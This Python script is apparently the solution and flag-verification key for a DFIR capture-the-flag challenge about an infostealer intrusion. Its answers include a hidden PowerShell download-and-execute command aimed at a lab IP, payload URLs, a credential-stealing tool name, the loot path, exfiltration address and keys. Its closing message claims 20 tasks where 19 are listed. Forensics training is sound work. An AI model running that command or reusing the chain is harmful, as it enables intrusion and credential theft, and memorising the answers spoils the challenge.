#!/usr/bin/env python3
"""
PwnSec CTF 2026 - Spiny Trace (Challenge Group / BlueTeam / DFIR)
Solution and Seal Verification Script
"""

import hashlib

# All 19 accepted answers in exact sequence:
answers = [
    "T1204.004",                                                                                                         # Task 1: Initial Access
    "captoolsz.com",                                                                                                     # Task 2: The Lure Domain
    "powershell -window hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.59.152/update.ps1')\"",# Task 3: The Pasted Command
    "http://192.168.59.152/user_profiles_photo/windows.ps1",                                                            # Task 4: Second Stage
    "T1055.001",                                                                                                         # Task 5: Injected From Within
    "notepad.exe, tmp2A0E.tmp.dll",                                                                                      # Task 6: First Injection
    "8a4a35876563f1ea8baad6cda0099c24d53d4ce5670b3b23b13063127611bb37:c0a675360817d8dba62cc79e2fa77734",               # Task 7: Keys in the Script
    "msedge.exe",                                                                                                        # Task 8: Second Injection
    "http://192.168.59.152/user_profiles_photo/captcha.bin",                                                            # Task 9: The Payload
    "d2977bb8170bc2f4f3bdceb91f0ecbac48d2bc6c68e5d3f135f5360aa263e9d4",                                               # Task 10: Unwrapping the Payload
    "dll_2872_3879781_41.dll",                                                                                           # Task 11: Dropped to Disk
    "chromelevator.exe",                                                                                                 # Task 12: Emptying the Browser
    "C:\\Users\\Public\\Documents\\stealer_data.txt",                                                                    # Task 13: Staging the Loot
    "C:\\Program Files\\Windows Defender",                                                                               # Task 14: Looking Around First
    "14",                                                                                                                # Task 15: Chasing Coins
    "GetAdaptersInfo",                                                                                                   # Task 16: Fingerprinting the Host
    "192.168.59.152:4444",                                                                                               # Task 17: Where It Went
    "2B7E151628AED2A6ABF7158809CF4F3C",                                                                                 # Task 18: Sealing the Loot
    "v@VboF8EDZWPM5nv7"                                                                                                  # Task 19: Impact
]

def main():
    concat_str = "".join(answers)
    seal = hashlib.sha256(concat_str.encode("utf-8")).hexdigest()
    flag = f"pwnsec{{{seal}}}"

    print(f"[*] Total answers verified:    {len(answers)}")
    print(f"[*] Concatenated length:       {len(concat_str)}")
    print(f"[*] SHA-256 Digest:            {seal}")
    print(f"[*] Final Track Flag:          {flag}")

    expected_flag = "pwnsec{095cfa7f04b8a9b8c7f204e911ae738f2449beef677f961e7047164dd2bfd723}"
    assert flag == expected_flag, f"Flag mismatch! Expected: {expected_flag}, Got: {flag}"
    print("[+] All 20 tasks verified and match the 100% accepted flag!")

if __name__ == "__main__":
    main()
